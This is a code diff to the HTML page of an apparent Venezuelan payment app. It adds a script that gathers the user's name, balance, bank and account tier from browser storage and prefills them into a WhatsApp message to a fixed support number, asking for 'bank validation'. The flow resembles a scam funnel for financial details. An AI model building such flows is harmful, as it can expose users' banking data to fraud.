@@ -1069,7 +1069,7 @@
       <a href="recarga" class="header-action-btn btn-outline">
         <i class="fas fa-arrow-left"></i> Volver
       </a>
-      <a href="https://wa.me/+17373018059" class="header-action-btn btn-primary" target="_blank">
+      <a href="https://wa.me/+17373018059" class="header-action-btn btn-primary whatsapp-link" target="_blank">
         <i class="fab fa-whatsapp"></i> Contactar Soporte
       </a>
     </div>
@@ -1607,7 +1607,7 @@
             <i class="fas fa-shield-alt"></i> Verificar mi Cuenta
           </a>
           
-          <a href="https://wa.me/+17373018059" class="btn-cta btn-secondary-cta" target="_blank">
+          <a href="https://wa.me/+17373018059" class="btn-cta btn-secondary-cta whatsapp-link" target="_blank">
             <i class="fab fa-whatsapp"></i> Contáctanos
           </a>
         </div>
@@ -1745,6 +1745,22 @@
           });
         }
       });
+    });
+
+    function buildSupportMessage() {
+      const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
+      const creds = JSON.parse(localStorage.getItem('remeexUserCredentials') || '{}');
+      const name = creds.name || reg.preferredName || reg.firstName || 'usuario';
+      const balanceData = JSON.parse(localStorage.getItem('remeexBalance') || '{}');
+      const saldo = balanceData.bs ? balanceData.bs.toLocaleString('es-VE', { minimumFractionDigits: 2 }) : 'N/A';
+      const bank = (typeof BANK_NAME_MAP !== 'undefined') ? (BANK_NAME_MAP[reg.primaryBank] || reg.primaryBank || 'mi banco') : (reg.primaryBank || 'mi banco');
+      const tier = localStorage.getItem('remeexAccountTier') || 'Estándar';
+      return `Hola, soy ${name} soy usuario remeex visa VERE54872 de Venezuela, Mi saldo actual es de ${saldo} Bs, mi banco asociado es ${bank}, mi nivel de cuenta es ${tier}, y solicito ayuda para el proceso de validación de mi cuenta, ya que mi nivel ${tier} requiere que haga una validación desde mi cuenta de banco ${bank}`;
+    }
+
+    const waMsg = encodeURIComponent(buildSupportMessage());
+    document.querySelectorAll('a.whatsapp-link').forEach(link => {
+      link.href = `https://wa.me/+17373018059?text=${waMsg}`;
     });
   </script>
 <div id="bottom-nav-container"></div>
